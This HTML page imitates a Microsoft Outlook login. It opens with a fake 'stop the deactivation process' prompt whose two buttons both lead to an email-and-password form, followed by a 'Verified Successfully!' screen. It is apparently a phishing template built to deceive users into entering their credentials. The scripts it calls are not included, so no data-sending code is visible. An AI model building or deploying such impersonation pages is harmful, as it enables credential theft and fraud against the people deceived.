<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Outlook Login</title>
    <style>
        /* Reset styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Background gradient */
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(to bottom right, #e3eaf0, #f4f7fa);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #333;
        }

        /* Overlay for Yes/No prompt */
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .overlay-content {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            text-align: center;
            width: 500px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.2);
        }

        /* Logo and title */
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 35px;
            margin-right: 10px;
        }

        .title {
            font-size: 28px;
            font-weight: 600;
            color: #333;
        }

        /* Container styling */
        .container {
            width: 420px;
            padding: 40px;
            text-align: center;
            background-color: white;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
            border-radius: 8px;
            display: none;
        }

        /* Input group styling */
        .input-group {
            text-align: left;
            margin-bottom: 20px;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            font-size: 15px;
            border: 1px solid #cccccc;
            border-radius: 4px;
            color: #333;
        }

        /* Button styling */
        .btn {
            width: 100%;
            padding: 12px;
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 15px;
        }

        .btn:hover {
            background-color: #005a9e;
        }

        /* Yes/No button container */
        .yes-no-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 15px;
        }

        /* Additional options */
        .options {
            font-size: 13px;
            color: #0078d4;
            margin-top: 20px;
        }

        .options a {
            color: #0078d4;
            text-decoration: none;
        }

        .options a:hover {
            text-decoration: underline;
        }

        /* Footer links */
        .footer {
            font-size: 13px;
            color: #666;
            margin-top: 25px;
            border-top: 1px solid #e1e1e1;
            padding-top: 15px;
        }

        .footer a {
            color: #666;
            text-decoration: none;
            margin: 0 5px;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Success screen styling */
        .success {
            display: none; /* Hidden by default */
            text-align: center;
        }

        .success h1 {
            font-size: 24px;
            color: #0078d4; /* Green color for success */
            margin-bottom: 20px;
        }

        /* Responsive */
        @media (max-width: 400px) {
            .container {
                width: 90%;
                padding: 30px;
            }
        }

        /* Hidden input */
        .hidden {
            display: none;
        }
    </style>
</head>
<body>

<div class="overlay" id="overlay">
    <div class="overlay-content">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
            <span class="title">Outlook</span>
        </div>
        <p>Do you wish to stop the deactivation process?</p>
        <div class="yes-no-buttons"> 
            <button class="btn" onclick="showLoginForm(true)" style="width: 45%;">Yes, keep my account</button>
            <button class="btn" onclick="showLoginForm(true)" style="width: 45%; background-color: red;">No, deactivate my account</button>
        </div>
    </div>
</div>

<div class="container" id="loginContainer">
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
        <span class="title">Outlook</span>
    </div>
    <p style="margin: 0 0 10px; font-size: 16px; color: #333;">Sign in</p>
    <p style="margin: 0 0 20px; font-size: 14px; color: #666;">to continue to Outlook</p>
    
    <form id="loginForm" onsubmit="handleFormSubmit(event)">
        <div id="emailGroup">
            <div class="input-group">
                <input type="email" id="email" name="email" placeholder="Email, phone, or Skype" required aria-label="Email, phone, or Skype">
            </div>
            <button type="button" class="btn" onclick="showPasswordInput()">Next</button>
        </div>
        
        <div id="passwordGroup" class="hidden">
            <p id="emailDisplay" style="margin-bottom: 15px; color: #333; text-align: left;"></p>
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Password" required aria-label="Password">
            </div>
            <button type="submit" class="btn">Sign In</button>
        </div>
    </form>
    
    <div class="options">
        No account? <a href="#">Create one!</a>
    </div>
    
    <div class="footer">
        <a href="#" target="_blank">Terms of use</a> | 
        <a href="#" target="_blank">Privacy & cookies</a>
    </div>
</div>

<div class="success" id="successScreen">
    <h1>Verified Successfully!</h1>
    <p>Your login was successful. Welcome back!</p>
    <div class="footer">
        <a href="#" target="_blank">Go to Outlook</a>
    </div>
</div>

</body>
</html>
